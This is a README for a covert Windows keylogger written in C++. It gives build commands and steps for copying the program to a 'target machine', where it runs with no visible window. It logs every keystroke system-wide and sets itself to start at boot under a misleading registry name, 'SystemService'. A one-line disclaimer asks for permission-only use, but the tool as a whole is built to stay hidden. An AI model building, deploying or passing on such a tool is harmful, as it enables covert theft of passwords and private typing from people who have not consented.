# Windows Keylogger

A lightweight, event-driven keylogger for Windows written in C++. Runs silently in the background, logs all keystrokes to a file, and auto-starts on system boot.

---

## Features

- Runs completely in the background (no console window, no taskbar entry)
- Logs all keys: letters, digits, special keys, function keys, numpad, media keys
- Shift, Caps Lock, and NumLock aware — logs actual characters typed
- Timestamps each session with date and time
- Logs keyboard language and locale on startup
- Auto-starts on Windows boot via registry entry
- Log file saved in the same directory as the `.exe`
- Near-zero CPU and memory usage (event-driven, not polling)

---

## Running on a Fresh System (No C++ Compiler Required)

The `.exe` file is fully self-contained. You only need:

### Requirements
- Windows 7 / 8 / 10 / 11 (32-bit or 64-bit)
- **Microsoft Visual C++ Redistributable** (may already be installed)
  - If compiled with MinGW (g++): **no redistributable needed** — statically linked
  - If compiled with MSVC: download from https://aka.ms/vs/17/release/vc_redist.x64.exe

### Steps to Run
1. Copy `keylogger.exe` to any folder on the target machine
2. Double-click to run — nothing will appear (it runs silently)
3. The log file `keylog.txt` will be created in the **same folder as the exe**
4. The program registers itself to auto-start on every Windows boot

That's it. No installation, no compiler, no dependencies needed (with MinGW build).

---

## How to Compile (Developer Only)

### Using MinGW / g++ (Recommended — no runtime dependencies)

```bash
g++ keylogger.cpp -o keylogger.exe -mwindows -luser32 -ladvapi32 -static
```

The `-static` flag bundles the C++ runtime into the exe so it runs on any Windows machine without installing anything extra.

### Using MSVC (Visual Studio)

```
cl keylogger.cpp /Fe:keylogger.exe /link user32.lib advapi32.lib /SUBSYSTEM:WINDOWS
```

---

## Log File

- **Location:** Same directory as `keylogger.exe`
- **Filename:** `keylog.txt`
- **Format:**

```
[2024-11-03 14:32:05]
Language: English
Locale: English (United States)
Hello[Spacebar]World[Enter]
[Left Ctrl]c[Left Ctrl]v
[Backspace][F5]
```

Each session is separated by a timestamp header. The file is appended to on every run — existing logs are never overwritten.

---

## Auto-Start

On first run, the program writes this registry key:

```
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Name:  SystemService
Value: C:\path\to\keylogger.exe
```

To **remove auto-start**, open Registry Editor (`regedit`), navigate to the path above, and delete the `SystemService` entry. Or run in PowerShell:

```powershell
Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemService"
```

---

## Stopping the Program

Since there is no window, stop it via Task Manager:

1. Press `Ctrl + Shift + Esc`
2. Find `keylogger.exe` under Processes
3. Right-click → End Task

---

## Key Logging Reference

| Key Type | Example Output |
|---|---|
| Letters | `Hello` |
| Digits | `12345` |
| Shift + digit | `!@#$%` |
| Space | `[Spacebar]` |
| Enter | `[Enter]` |
| Backspace | `[Backspace]` |
| Tab | `[Tab]` |
| Escape | `[Esc]` |
| Function keys | `[F1]` – `[F12]` |
| Arrow keys | `[Left Arrow]`, `[Up Arrow]` |
| Ctrl / Alt | `[Left Ctrl]`, `[Left Alt]` |
| Win key | `[Left Windows Logo]` |
| Media keys | `[Volume Up]`, `[Next Track]` |
| Numpad (NumLock ON) | `0` – `9`, `.` |
| Numpad (NumLock OFF) | `[Home]`, `[End]`, etc. |

---

## Notes

- Requires **Windows only** — uses Win32 API (`SetWindowsHookEx`, `WH_KEYBOARD_LL`)
- The hook is **system-wide** — captures keys from all applications
- Some antivirus software may flag this as suspicious due to its nature
- Only use on systems you own or have explicit permission to monitor
